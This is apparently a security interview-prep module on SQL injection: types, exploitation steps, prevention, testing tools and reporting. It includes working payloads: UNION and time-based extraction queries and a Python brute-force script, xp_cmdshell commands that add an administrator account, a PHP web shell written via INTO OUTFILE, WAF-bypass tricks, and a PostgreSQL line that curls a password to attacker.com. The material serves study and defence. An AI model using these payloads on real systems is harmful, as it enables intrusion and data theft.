# SQL Injection - Interview Questions & Answers

<!-- interview-module:v1 -->

> **How to use this interview module**
>
> **Practice:** Cover each answer, then explain it aloud in **60–120 seconds**. Add **one concrete example** from work or a lab.
>
> **Pair with:** the **Comprehensive Guide** and **Critical Clarification** for this topic (if present).

---

## **Fundamental Questions**

### **Q1: What is SQL Injection and how does it work?**

**Answer:**

SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user-supplied input is not properly validated, sanitized, or parameterized before being used in SQL queries.

**How it works:**

1. **Vulnerable Code:**

```python
username = request.form['username']
query = f"SELECT * FROM users WHERE username = '{username}'"

```

1. **Attack Input:**

```
Username: admin'--

```

1. **Resulting Query:**

```sql
SELECT * FROM users WHERE username = 'admin'--'

```

1. **Impact:**
- The `-` comments out the rest of the query
- Bypasses authentication
- Allows unauthorized access

**Key Point:** SQL injection works because the application treats user input as SQL code rather than data.

---

### **Q2: What are the main types of SQL Injection?**

**Answer:**

**1. Classic/In-Band SQL Injection:**

- Attacker receives results directly in application response
- **Subtypes:**
    - **Error-Based**: Exploits database error messages
    - **Union-Based**: Uses UNION to combine queries

**2. Blind SQL Injection:**

- Attacker doesn't see direct results
- Infers information from application behavior
- **Subtypes:**
    - **Boolean-Based**: Uses true/false conditions
    - **Time-Based**: Uses time delays

**3. Second-Order SQL Injection:**

- Malicious input stored and executed later
- Example: Stored username exploited during login

**4. Out-of-Band SQL Injection:**

- Uses alternative channels (DNS, HTTP) to extract data
- Less common but still dangerous

---

### **Q3: What is the difference between error-based and blind SQL injection?**

**Answer:**

**Error-Based SQL Injection:**

- Database errors are visible to attacker
- Errors reveal database structure
- Easier to exploit
- Example: `' OR 1=1--` shows SQL error

**Blind SQL Injection:**

- No direct error messages
- Attacker infers information from behavior
- Harder to exploit but still dangerous
- **Boolean-Based**: Different responses for true/false
- **Time-Based**: Delayed responses indicate success

**Example - Boolean-Based:**

```sql
-- True condition
' AND 1=1--  → Returns data

-- False condition
' AND 1=2--  → No data returned

```

**Example - Time-Based:**

```sql
-- If condition is true, delay 5 seconds
'; IF(1=1, WAITFOR DELAY '00:00:05', 0)--

```

---

## **Types and Techniques**

### **Q4: How would you exploit a UNION-based SQL injection?**

**Answer:**

**Step 1: Determine Column Count**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Continue until error

```

**Step 2: Find Compatible Columns**

```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--

```

**Step 3: Extract Data**

```sql
-- Extract database version
' UNION SELECT NULL, @@version, NULL--

-- Extract table names
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--

-- Extract column names
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract user data
' UNION SELECT NULL, username, password FROM users--

```

**Key Points:**

- Number of columns must match
- Data types must be compatible
- Use NULL for incompatible columns

---

### **Q5: Explain time-based blind SQL injection with an example.**

**Answer:**

Time-based blind SQL injection uses time delays to infer information when no direct output is available.

**Technique:**

```sql
-- Test if condition is true (delays if true)
'; IF(condition, WAITFOR DELAY '00:00:05', 0)--

```

**Example - Extract Password Character:**

```sql
-- Test if first character is 'a' (ASCII 97)
'; IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97, WAITFOR DELAY '00:00:05', 0)--

-- If response is delayed, first character is 'a'
-- Repeat for each character position

```

**Automated Extraction:**

```python
import requests
import time

def extract_char(position):
    for char_code in range(32, 127):
        payload = f"'; IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),{position},1))={char_code}, WAITFOR DELAY '00:00:05', 0)--"
        start = time.time()
        requests.get(f"http://target.com/page?id={payload}")
        elapsed = time.time() - start
        if elapsed > 4:
            return chr(char_code)
    return None

```

**Key Points:**

- Slower than other methods
- Requires patience
- Can extract complete databases
- Harder to detect

---

### **Q6: What is second-order SQL injection?**

**Answer:**

Second-order SQL injection occurs when malicious input is stored in the database and later used in a SQL query without proper sanitization.

**Attack Scenario:**

**Step 1: Registration (Stored)**

```python

# Attacker registers with malicious username

username = "admin'--"
db.execute(f"INSERT INTO users (username, password) VALUES ('{username}', 'password')")

# Stored as: admin'--

```

**Step 2: Login (Exploited)**

```python

# Later, during login

username = get_username_from_db()  # Returns: admin'--
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

# Executes: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'

# Bypasses password check

```

**Why it's dangerous:**

- Input may pass initial validation
- Stored data is trusted
- Exploited in different context
- Harder to detect

**Mitigation:**

- Always use parameterized queries
- Validate input at all stages
- Don't trust stored data

---

## **Security Questions**

### **Q7: What is the impact of SQL injection?**

**Answer:**

**1. Authentication Bypass:**

- Login without credentials
- Access any user account
- Escalate privileges

**2. Data Breach:**

- Extract all user data
- Access sensitive information
- Read configuration files

**3. Data Manipulation:**

- Modify user data
- Change prices/values
- Alter records

**4. Data Deletion:**

- Delete entire tables
- Drop databases
- Truncate data

**5. Remote Code Execution:**

- Execute OS commands
- Access file system
- Install backdoors

**6. Server Compromise:**

- Complete system control
- Access internal network
- Use as attack platform

**Business Impact:**

- Financial losses
- Reputation damage
- Legal/regulatory violations
- Customer trust loss

---

### **Q8: How can SQL injection lead to remote code execution?**

**Answer:**

**MSSQL Example:**

```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

-- Execute commands
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add'--
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--

```

**MySQL Example:**

```sql
-- Write to file
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php'--

```

**PostgreSQL Example:**

```sql
-- Execute commands
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('whoami');--

```

**Prerequisites:**

- Database user with high privileges
- Certain database features enabled
- File system access

**Mitigation:**

- Use least privilege
- Disable dangerous functions
- Network segmentation

---

## **Mitigation Questions**

### **Q9: How do you prevent SQL injection?**

**Answer:**

**Primary Defense: Parameterized Queries (Prepared Statements)**

```python

# ✅ CORRECT

query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))

```

**Why it works:**

- Separates SQL code from data
- Database treats input as data, not code
- Prevents injection regardless of input

**Additional Defenses:**

**1. Input Validation:**

```python
import re

def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username

```

**2. Least Privilege:**

```sql
-- Database user with minimal privileges
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';
-- No DROP, ALTER, or EXECUTE privileges

```

**3. Error Handling:**

```python
try:
    cursor.execute(query, params)
except DatabaseError as e:
    logger.error(f"Database error: {str(e)}")

# Don't expose error details

    raise ApplicationError("An error occurred")

```

**4. WAF (Secondary Defense):**

- Deploy WAF as additional layer
- Not a substitute for secure coding

---

### **Q10: What is the difference between parameterized queries and input sanitization?**

**Answer:**

**Parameterized Queries (Prepared Statements):**

- **Primary defense** against SQL injection
- Separates SQL code from data
- Database treats input as data, not code
- **Always effective** when used correctly

```python

# ✅ CORRECT

query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))

```

**Input Sanitization:**

- **Secondary defense** (not sufficient alone)
- Attempts to remove/escape dangerous characters
- Can be bypassed with encoding/obfuscation
- **Not reliable** as primary defense

```python

# ⚠️ NOT SUFFICIENT ALONE

def sanitize(input_value):
    return input_value.replace("'", "''")  # Can be bypassed!

```

**Why Sanitization Fails:**

```python

# Attacker can use encoding

username = "admin'--"  # Blocked
username = "admin%27--"  # URL encoded, might bypass
username = "admin\u0027--"  # Unicode, might bypass

```

**Key Point:** Always use parameterized queries as primary defense. Sanitization is additional layer only.

---

### **Q11: Can input validation alone prevent SQL injection?**

**Answer:**

**No, input validation alone cannot prevent SQL injection.**

**Why Input Validation is Not Enough:**

**1. Bypass Techniques:**

```python

# Validation: Only alphanumeric

username = "admin123"  # Passes validation

# But what if query is

query = f"SELECT * FROM users WHERE id = {user_id}"

# user_id = "1 OR 1=1"  # No quotes needed

```

**2. Encoding/Obfuscation:**

```python

# Validation blocks: admin'--

# But attacker uses

username = "admin%27--"  # URL encoded
username = "admin\u0027--"  # Unicode
username = "admin" + chr(39) + "--"  # Character code

```

**3. Context Matters:**

```python

# Validation allows: admin123

# But in different context

query = f"SELECT * FROM users WHERE id = {user_id}"

# user_id = "1 UNION SELECT * FROM users--"

# No quotes, validation passes

```

**Correct Approach:**

- ✅ **Primary**: Parameterized queries
- ✅ **Secondary**: Input validation
- ✅ **Tertiary**: WAF, error handling

**Key Point:** Input validation helps but parameterized queries are the only reliable defense.

---

## **Scenario-Based Questions**

### **Q12: You discover SQL injection in a login form. How would you exploit it?**

**Answer:**

**Step 1: Identify Vulnerability**

```python

# Vulnerable code

username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

```

**Step 2: Test Basic Injection**

```
Username: admin'--
Password: (anything)

```

**Step 3: Resulting Query**

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
-- Password check is commented out!

```

**Step 4: Alternative Payloads**

```
Username: ' OR '1'='1
Username: ' OR '1'='1'--
Username: admin' OR '1'='1'--
Username: ' UNION SELECT * FROM users--

```

**Step 5: Extract Data (if UNION works)**

```
Username: ' UNION SELECT username, password FROM users--

```

**Impact:**

- Bypass authentication
- Access any account
- Extract credentials
- Escalate privileges

---

### **Q13: How would you test for blind SQL injection?**

**Answer:**

**Boolean-Based Testing:**

**Step 1: Identify Different Behaviors**

```sql
-- True condition
' AND 1=1--  → Returns data/normal response

-- False condition
' AND 1=2--  → No data/error response

```

**Step 2: Extract Information Character by Character**

```sql
-- Test if first character of password is 'a'
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--

-- If true, get normal response
-- If false, get different response

```

**Time-Based Testing:**

**Step 1: Confirm Vulnerability**

```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '00:00:05'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

```

**Step 2: Extract Data**

```sql
-- Extract character by character
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97, SLEEP(5), 0)--

-- If delayed, character is 'a' (ASCII 97)

```

**Automation:**

- Use SQLMap for automated extraction
- Script custom extraction tools
- Monitor response times

---

## **Advanced Questions**

### **Q14: How would you bypass WAF (Web Application Firewall) for SQL injection?**

**Answer:**

**1. Encoding/Obfuscation:**

```sql
-- Original: ' OR '1'='1
-- URL encoded: %27%20OR%20%271%27%3D%271
-- Unicode: \u0027 OR \u00271\u0027=\u00271
-- Hex: 0x27 OR 0x2731=0x2731

```

**2. Alternative Keywords:**

```sql
-- Instead of: UNION SELECT
-- Use: UNION/**/SELECT
-- Use: UNI/**/ON SEL/**/ECT
-- Use: /*comment*/UNION/*comment*/SELECT

```

**3. Case Variation:**

```sql
-- Instead of: SELECT
-- Use: SeLeCt
-- Use: sElEcT

```

**4. Function Alternatives:**

```sql
-- Instead of: OR 1=1
-- Use: OR 1=1-0
-- Use: OR '1'='1'
-- Use: OR CHAR(49)=CHAR(49)

```

**5. Time-Based (Harder to Detect):**

```sql
-- Instead of: UNION SELECT
-- Use: '; WAITFOR DELAY '00:00:05'--

```

**6. Comments:**

```sql
-- Use comments to break up keywords
'/**/OR/**/1=1--
'/*comment*/OR/*comment*/1=1--

```

**Key Point:** WAF bypass is possible, which is why parameterized queries are essential.

---

### **Q15: Explain how SQL injection can be used for SSRF (Server-Side Request Forgery).**

**Answer:**

**Scenario:** SQL injection in database that supports making HTTP requests.

**MSSQL Example:**

```sql
-- Enable advanced options
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--

-- Enable OLE Automation
'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;--

-- Make HTTP request
'; DECLARE @h INT; EXEC sp_OACreate 'MSXML2.XMLHTTP', @h OUT; EXEC sp_OAMethod @h, 'open', NULL, 'GET', 'http://internal-server:8080/admin', false; EXEC sp_OAMethod @h, 'send';--

```

**PostgreSQL Example:**

```sql
-- Using COPY command
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=' || (SELECT password FROM users WHERE id=1);--

```

**Impact:**

- Access internal services
- Bypass network restrictions
- Extract data via out-of-band channels
- Port scanning internal network

**Mitigation:**

- Use least privilege
- Disable dangerous functions
- Network segmentation
- Parameterized queries

---

## **Penetration Testing Questions**

### **Q16: How would you test for SQL injection during a penetration test?**

**Answer:**

**1. Reconnaissance:**

- Identify all input points
- URL parameters
- POST data
- HTTP headers
- Cookies

**2. Basic Testing:**

```sql
-- Test for errors
'
"
`

-- Test basic injection
' OR '1'='1
' OR '1'='1'--
' OR 1=1--

```

**3. Database Fingerprinting:**

```sql
-- MySQL
' AND @@version LIKE 'MySQL%'--

-- MSSQL
' AND @@version LIKE 'Microsoft%'--

-- PostgreSQL
' AND version() LIKE 'PostgreSQL%'--

```

**4. Schema Enumeration:**

```sql
-- List tables
' UNION SELECT table_name FROM information_schema.tables--

-- List columns
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

```

**5. Data Extraction:**

```sql
-- Extract data
' UNION SELECT username, password FROM users--

```

**6. Tools:**

- SQLMap for automated testing
- Burp Suite for manual testing
- Custom scripts for specific cases

**7. Blind Testing:**

- Boolean-based: Different responses
- Time-based: Delayed responses

---

### **Q17: What tools would you use for SQL injection testing?**

**Answer:**

**1. SQLMap:**

```bash

# Basic scan

sqlmap -u "http://target.com/page?id=1" --dbs

# Extract data

sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# Advanced options

sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --tamper=space2comment

```

**2. Burp Suite:**

- SQL injection scanner
- Manual testing
- Intruder for fuzzing
- Repeater for payload testing

**3. OWASP ZAP:**

- Automated scanning
- Manual testing
- Fuzzing capabilities

**4. Custom Scripts:**

```python
import requests

payloads = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' UNION SELECT NULL--",
    "'; WAITFOR DELAY '00:00:05'--"
]

for payload in payloads:
    response = requests.get(f"http://target.com/search?q={payload}")
    if "error" in response.text.lower() or response.elapsed.total_seconds() > 4:
        print(f"Potential SQLi: {payload}")

```

**5. NoSQLMap:**

- For NoSQL injection testing

---

### **Q18: How would you report a SQL injection vulnerability?**

**Answer:**

**Report Structure:**

**1. Executive Summary:**

- Vulnerability type
- Severity (Critical/High/Medium/Low)
- Affected component
- Business impact

**2. Technical Details:**

- Vulnerable endpoint
- Vulnerable code snippet
- Attack vector
- Proof of concept

**3. Impact Assessment:**

- Confidentiality impact
- Integrity impact
- Availability impact
- Business impact

**4. Steps to Reproduce:**

```
1. Navigate to http://target.com/login
2. Enter username: admin'--
3. Enter password: (anything)
4. Click login
5. Successfully logged in as admin

```

**5. Remediation:**

- Use parameterized queries
- Input validation
- Least privilege
- Error handling

**6. Evidence:**

- Screenshots
- Request/response logs
- Video demonstration

**7. Risk Rating:**

- CVSS score
- Likelihood
- Impact
- Business risk

---

## **Summary**

SQL Injection remains a critical vulnerability. Key points for interviews:

1. **Always use parameterized queries** - Primary defense
2. **Input validation is not enough** - Secondary defense only
3. **Multiple types exist** - Classic, blind, second-order, out-of-band
4. **High impact** - Authentication bypass, data breach, RCE
5. **Testing methodology** - Recon, detection, exploitation, reporting
6. **Tools available** - SQLMap, Burp Suite, custom scripts
7. **Defense in depth** - Multiple layers of protection

Remember: **SQL injection is prevented by parameterized queries, not by input validation or WAFs alone!**

---

## Depth: Interview follow-ups — SQL Injection

**Authoritative references:** [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection); [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html); [CWE-89](https://cwe.mitre.org/data/definitions/89.html).

**Follow-ups:**
- **Second-order SQLi:** Stored payload executed later—how do you test?
- **ORM isn’t automatic safety:** Raw queries, string concat in migrations, reporting DBs.
- **Blind techniques:** timing/boolean inference—impact on prioritization.

**Production verification:** Parametrize all query paths; static analysis + DAST; least-privilege DB roles.

**Cross-read:** Parameterized Statements, IDOR (different layer), Secure Code Review.

<!-- verified-depth-merged:v1 ids=sql-injection -->

---

## Flagship Mock Question Ladder — SQL Injection

**Primary competency axis:** injection root cause, exploit classes, defensive query construction.

### Junior (Fundamental clarity)

- What causes SQL injection at code level?
- Why are parameterized queries the primary fix?
- What is the difference between error-based and blind SQLi?

### Senior (Design and trade-offs)

- How can SQLi still happen in ORM-heavy codebases?
- How would you triage a suspected second-order SQLi report?
- What database permissions model limits SQLi blast radius?

### Staff (Strategy and scale)

- How do you reduce SQLi class recurrence across hundreds of repos?
- Which SDL gate should block release for injection regressions?
- How do you quantify SQLi risk reduction for leadership?

### 10-minute mock drill format

- **3 min:** Pick one Junior prompt and answer with definition, mechanism, and one mitigation.
- **4 min:** Pick one Senior prompt and answer with trade-offs and implementation caveats.
- **3 min:** Pick one Staff prompt and answer with architecture/policy plus measurement plan.

### Answer quality rubric (quick score)

Score each answer from 0 to 2 for:

- **Accuracy** (facts and mechanism)
- **Depth** (trade-offs and failure modes)
- **Practicality** (implementable controls)
- **Verification** (tests/telemetry proving success)

**Interpretation:** `7-8/8` indicates strong interview-readiness for this topic.
